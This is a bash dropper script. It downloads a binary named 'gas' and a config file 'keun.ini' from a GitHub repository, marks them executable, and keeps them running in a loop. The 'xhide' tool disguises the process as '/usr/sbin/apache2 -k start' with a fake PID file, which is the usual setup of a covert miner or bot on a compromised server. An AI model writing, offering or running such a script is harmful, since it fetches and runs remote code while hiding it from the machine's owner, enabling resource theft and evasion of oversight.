#!/bin/bash
chmod +x xhide
wget https://github.com/DarshGoswami1982/asu/raw/main/gas
chmod +x gas
wget https://github.com/DarshGoswami1982/asu/raw/main/keun.ini
while [ 1 ]; do
./xhide -s "/usr/sbin/apache2 -k start" -d -p Apache2.pid ./gas keun.ini
sleep 5
done
sleep 999999999 
